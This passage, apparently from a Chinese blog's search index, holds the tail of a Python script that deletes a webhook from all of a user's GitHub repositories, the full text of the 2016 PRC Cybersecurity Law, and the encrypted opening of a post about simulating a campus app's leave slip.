class="line">            headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;token <span class="subst">&#123;access_token&#125;</span>&quot;</span>&#125;,</span><br><span class="line">            params=&#123;<span class="string">&quot;per_page&quot;</span>: per_page, <span class="string">&quot;page&quot;</span>: page&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            repos = response.json()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> repos:  <span class="comment"># 如果当前页没有仓库信息，说明已经获取完所有仓库</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> repo <span class="keyword">in</span> repos:</span><br><span class="line">                repo_name = repo[<span class="string">&quot;full_name&quot;</span>]</span><br><span class="line">                delete_webhook(repo_name, webhook_url, access_token)</span><br><span class="line">            page += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;无法获取仓库列表。状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 填写你的 Access Token 和 Webhook 地址</span></span><br><span class="line">    access_token = <span class="string">&quot;你的access_token&quot;</span></span><br><span class="line">    webhook_url = <span class="string">&quot;你的Webhook地址&quot;</span></span><br><span class="line"></span><br><span class="line">    delete_all_webhooks(webhook_url, access_token)</span><br></pre></td></tr></table></figure></div>

<h3 id="注意事项和使用须知"><a href="#注意事项和使用须知" class="headerlink" title="注意事项和使用须知"></a>注意事项和使用须知</h3><ul>
<li><strong>Access Token 安全性</strong>：请妥善保管你的 Access Token，不要泄露给他人，因为它具有对你的 GitHub 仓库进行操作的权限。</li>
<li><strong>网络请求频率</strong>：GitHub 的 API 有请求频率限制，过</li>
</ul>
<p>于频繁的请求可能会被拒绝。为了避免这种情况，建议在脚本中添加适当的延迟，以减缓请求频率。</p>
<ul>
<li><strong>脚本参数修改</strong>：在使用脚本之前，你需要根据自己的情况修改脚本中的 Access Token 和 Webhook 地址参数。</li>
<li><strong>异常处理</strong>：脚本中包含了部分异常处理，但仍有可能因为网络或其他原因导致请求失败，建议在实际使用中注意查看日志，及时处理异常情况。</li>
</ul>
<h3 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h3><p>本文所提供的脚本仅供参考和学习之用，使用者应对其在实际生产环境中可能产生的任何后果负全部责任。在使用之前，请务必仔细阅读并理解 GitHub 的 API 使用条款和隐私政策。</p>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Github</tag>
        <tag>Python脚本</tag>
        <tag>自动化</tag>
        <tag>Webhook</tag>
        <tag>开发工具</tag>
      </tags>
  </entry>
  <entry>
    <title>中华人民共和国网络安全法</title>
    <url>/posts/b81fa239.html</url>
    <content><![CDATA[<h1 id="中华人民共和国网络安全法"><a href="#中华人民共和国网络安全法" class="headerlink" title="中华人民共和国网络安全法"></a>中华人民共和国网络安全法</h1><p>​		（2016年11月7日第十二届全国人民代表大会常务委员会第二十四次会议通过）</p>
<p>来源： 中国人大网 2016年11月7日 17:31:34</p>
<p>目  录</p>
<p>  [第一章  总  则](#第一章  总  则)</p>
<p>  [第二章  网络安全支持与促进](#第二章  网络安全支持与促进)</p>
<p>  <a href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%90%E8%A1%8C%E5%AE%89%E5%85%A8">第三章  网络运行安全</a></p>
<p>​          <a href="#%E7%AC%AC%E4%B8%80%E8%8A%82-%E4%B8%80%E8%88%AC%E8%A7%84%E5%AE%9A">第一节 一般规定</a></p>
<p>​          <a href="#%E7%AC%AC%E4%BA%8C%E8%8A%82-%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E7%9A%84%E8%BF%90%E8%A1%8C%E5%AE%89%E5%85%A8">第二节 关键信息基础设施的运行安全</a></p>
<p>  <a href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8">第四章  网络信息安全</a></p>
<p>  <a href="#%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%9B%91%E6%B5%8B%E9%A2%84%E8%AD%A6%E4%B8%8E%E5%BA%94%E6%80%A5%E5%A4%84%E7%BD%AE">第五章 监测预警与应急处置</a></p>
<p>  [第六章 法律责任](#第六章 法律责任)</p>
<p>  [第七章 附  则](#第七章 附  则)</p>
<h2 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章  总  则"></a>第一章  总  则</h2><p><strong>第一条</strong> 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p>
<p><strong>第二条</strong> 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p>
<p><strong>第三条</strong> 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p>
<p><strong>第四条</strong> 国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p>
<p><strong>第五条</strong> 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p>
<p><strong>第六条</strong> 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p>
<p><strong>第七条</strong> 国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p>
<p><strong>第八条</strong> 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。</p>
<p>县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p>
<p><strong>第九条</strong> 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p>
<p><strong>第十条</strong> 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p>
<p><strong>第十一条</strong> 网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p>
<p><strong>第十二条</strong> 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。</p>
<p>任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p>
<p><strong>第十三条</strong> 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p>
<p><strong>第十四条</strong> 任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。</p>
<p>有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p>
<h2 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章  网络安全支持与促进"></a>第二章  网络安全支持与促进</h2><p><strong>第十五条</strong> 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。</p>
<p>国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p>
<p><strong>第十六条</strong> 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p>
<p><strong>第十七条</strong> 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p>
<p><strong>第十八条</strong> 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。</p>
<p>国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p>
<p><strong>第十九条</strong> 各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。</p>
<p>大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p>
<p><strong>第二十条</strong> 国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p>
<h2 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h2><h3 id="第一节-一般规定"><a href="#第一节-一般规定" class="headerlink" title="第一节 一般规定"></a>第一节 一般规定</h3><p><strong>第二十一条</strong> 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p>
<p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p>
<p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p>
<p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p>
<p>（四）采取数据分类、重要数据备份和加密等措施；</p>
<p>（五）法律、行政法规规定的其他义务。</p>
<p><strong>第二十二条</strong> 网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p>
<p>网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。</p>
<p>网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p>
<p><strong>第二十三条</strong> 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p>
<p><strong>第二十四条</strong> 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。</p>
<p>国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p>
<p><strong>第二十五条</strong> 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p>
<p><strong>第二十六条</strong> 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p>
<p><strong>第二十七条</strong> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p>
<p><strong>第二十八条</strong> 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p>
<p><strong>第二十九条</strong> 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。</p>
<p>有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p>
<p><strong>第三十条</strong> 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p>
<h3 id="第二节-关键信息基础设施的运行安全"><a href="#第二节-关键信息基础设施的运行安全" class="headerlink" title="第二节 关键信息基础设施的运行安全"></a>第二节 关键信息基础设施的运行安全</h3><p><strong>第三十一条</strong> 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</p>
<p>国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p>
<p><strong>第三十二条</strong> 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p>
<p><strong>第三十三条</strong> 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p>
<p><strong>第三十四条</strong> 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p>
<p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p>
<p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p>
<p>（三）对重要系统和数据库进行容灾备份；</p>
<p>（四）制定网络安全事件应急预案，并定期进行演练；</p>
<p>（五）法律、行政法规规定的其他义务。</p>
<p><strong>第三十五条</strong> 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p>
<p><strong>第三十六条</strong> 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p>
<p><strong>第三十七条</strong> 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p>
<p><strong>第三十八条</strong> 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p>
<p><strong>第三十九条</strong> 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p>
<p>（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p>
<p>（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p>
<p>（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p>
<p>（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p>
<h2 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h2><p><strong>第四十条</strong> 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p>
<p><strong>第四十一条</strong> 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。</p>
<p>网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p>
<p><strong>第四十二条</strong> 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。</p>
<p>网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p>
<p><strong>第四十三条</strong> 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p>
<p><strong>第四十四条</strong> 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p>
<p><strong>第四十五条</strong> 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p>
<p><strong>第四十六条</strong> 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p>
<p><strong>第四十七条</strong> 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p>
<p><strong>第四十八条</strong> 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。</p>
<p>电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p>
<p><strong>第四十九条</strong> 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。</p>
<p>网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p>
<p><strong>第五十条</strong> 国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p>
<h2 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h2><p><strong>第五十一条</strong> 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p>
<p><strong>第五十二条</strong> 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p>
<p><strong>第五十三条</strong> 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。</p>
<p>负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。</p>
<p>网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p>
<p><strong>第五十四条</strong> 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p>
<p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p>
<p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p>
<p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p>
<p><strong>第五十五条</strong> 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p>
<p><strong>第五十六条</strong> 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p>
<p><strong>第五十七条</strong> 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p>
<p><strong>第五十八条</strong> 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p>
<h2 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h2><p><strong>第五十九条</strong> 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p>
<p>关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p>
<p><strong>第六十条</strong> 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p>
<p>（一）设置恶意程序的；</p>
<p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；</p>
<p>（三）擅自终止为其产品、服务提供安全维护的。</p>
<p><strong>第六十一条</strong> 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p>
<p><strong>第六十二条</strong> 违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p>
<p><strong>第六十三条</strong> 违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。</p>
<p>单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p>
<p>违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p>
<p><strong>第六十四条</strong> 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。</p>
<p>违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p>
<p><strong>第六十五条</strong> 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p>
<p><strong>第六十六条</strong> 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p>
<p><strong>第六十七条</strong> 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。</p>
<p>单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p>
<p><strong>第六十八条</strong> 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p>
<p>电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p>
<p><strong>第六十九条</strong> 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p>
<p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p>
<p>（二）拒绝、阻碍有关部门依法实施的监督检查的；</p>
<p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p>
<p><strong>第七十条</strong> 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p>
<p><strong>第七十一条</strong> 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p>
<p><strong>第七十二条</strong> 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p>
<p><strong>第七十三条</strong> 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p>
<p>网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p>
<p><strong>第七十四条</strong> 违反本法规定，给他人造成损害的，依法承担民事责任。</p>
<p>违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p>
<p><strong>第七十五条</strong> 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p>
<h2 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附  则"></a>第七章 附  则</h2><p><strong>第七十六条</strong> 本法下列用语的含义：</p>
<p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p>
<p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p>
<p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p>
<p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p>
<p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p>
<p><strong>第七十七条</strong> 存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p>
<p><strong>第七十八条</strong> 军事网络的安全保护，由中央军事委员会另行规定。</p>
<p><strong>第七十九条</strong> 本法自2017年6月1日起施行。</p>
]]></content>
      <categories>
        <category>法律</category>
        <category>网络安全法</category>
      </categories>
      <tags>
        <tag>法律</tag>
      </tags>
  </entry>
  <entry>
    <title>从应用内存上来研究智慧曲园模拟请假条</title>
    <url>/posts/6cb5ad08.html</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码不太对，去问问作者吧。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
